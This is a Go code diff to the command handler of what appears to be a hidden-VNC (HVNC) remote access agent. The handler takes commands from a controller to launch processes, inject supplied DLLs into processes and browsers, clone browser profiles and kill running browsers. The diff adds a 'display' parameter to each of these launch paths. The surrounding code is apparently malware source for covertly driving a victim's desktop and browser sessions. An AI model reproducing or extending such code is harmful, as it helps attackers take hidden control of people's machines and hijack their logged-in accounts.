@@ -1499,6 +1499,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		filePath := ""
 		killExe := ""
 		operaPatch := false
+		display := 0
 		if payload != nil {
 			if v, ok := payload["path"].(string); ok {
 				filePath = v
@@ -1509,8 +1510,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if v, ok := payload["opera_patch"].(bool); ok {
 				operaPatch = v
 			}
+			if v, ok := payload["display"].(float64); ok {
+				display = int(v)
+			}
 		}
-		log.Printf("hvnc: start process %q (kill_exe=%q opera_patch=%v)", filePath, killExe, operaPatch)
+		log.Printf("hvnc: start process %q (kill_exe=%q opera_patch=%v display=%d)", filePath, killExe, operaPatch, display)
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_process", nil, func() {
 			sendLaunchStatus := func(step string, success bool, detail string) {
@@ -1531,7 +1535,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				}
 			}
 			sendLaunchStatus("launch", true, fmt.Sprintf("starting %s", filePath))
-			if err := capture.StartHVNCProcess(filePath, operaPatch); err != nil {
+			if err := capture.StartHVNCProcess(filePath, operaPatch, display); err != nil {
 				log.Printf("hvnc: start process failed for %q: %v", filePath, err)
 				sendLaunchStatus("launch", false, fmt.Sprintf("failed: %v", err))
 			} else {
@@ -1635,6 +1639,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		filePath := ""
 		searchPath := ""
 		replacePath := ""
+		display := 0
 		if payload != nil {
 			if v, ok := payload["path"].(string); ok {
 				filePath = v
@@ -1645,6 +1650,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if v, ok := payload["replace_path"].(string); ok {
 				replacePath = v
 			}
+			if v, ok := payload["display"].(float64); ok {
+				display = int(v)
+			}
 		}
 		dllBytes := extractDLLBytes(payload)
 		if len(dllBytes) == 0 {
@@ -1652,10 +1660,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return nil
 		}
 		captureDllBytes := extractCaptureDLLBytes(payload)
-		log.Printf("hvnc: start process injected %q search=%q replace=%q dllSize=%d captureDllSize=%d", filePath, searchPath, replacePath, len(dllBytes), len(captureDllBytes))
+		log.Printf("hvnc: start process injected %q search=%q replace=%q display=%d dllSize=%d captureDllSize=%d", filePath, searchPath, replacePath, display, len(dllBytes), len(captureDllBytes))
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_process_injected", nil, func() {
-			if _, err := capture.StartHVNCProcessInjected(filePath, dllBytes, captureDllBytes, searchPath, replacePath); err != nil {
+			if _, err := capture.StartHVNCProcessInjected(filePath, dllBytes, captureDllBytes, searchPath, replacePath, display); err != nil {
 				log.Printf("hvnc: injected process failed for %q: %v", filePath, err)
 			}
 		})
@@ -1691,6 +1699,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		clone := true
 		cloneLite := false
 		killIfRunning := false
+		display := 0
 		if payload != nil {
 			if v, ok := payload["browser"].(string); ok {
 				browser = v
@@ -1707,6 +1716,9 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if v, ok := payload["killIfRunning"].(bool); ok {
 				killIfRunning = v
 			}
+			if v, ok := payload["display"].(float64); ok {
+				display = int(v)
+			}
 		}
 		dllBytes := extractDLLBytes(payload)
 		if len(dllBytes) == 0 {
@@ -1717,7 +1729,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "no browser specified")
 			return nil
 		}
-		log.Printf("hvnc: start browser injected browser=%q path=%q clone=%v cloneLite=%v killIfRunning=%v dllSize=%d", browser, exePath, clone, cloneLite, killIfRunning, len(dllBytes))
+		log.Printf("hvnc: start browser injected browser=%q path=%q clone=%v cloneLite=%v killIfRunning=%v display=%d dllSize=%d", browser, exePath, clone, cloneLite, killIfRunning, display, len(dllBytes))
 		captureDllBytes := extractCaptureDLLBytes(payload)
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_browser_injected", nil, func() {
@@ -1751,7 +1763,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					Detail:  detail,
 				})
 			}
-			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, onProgress, onDXGIStatus, onLaunchStatus); err != nil {
+			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, display, onProgress, onDXGIStatus, onLaunchStatus); err != nil {
 				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
 			}
 		})
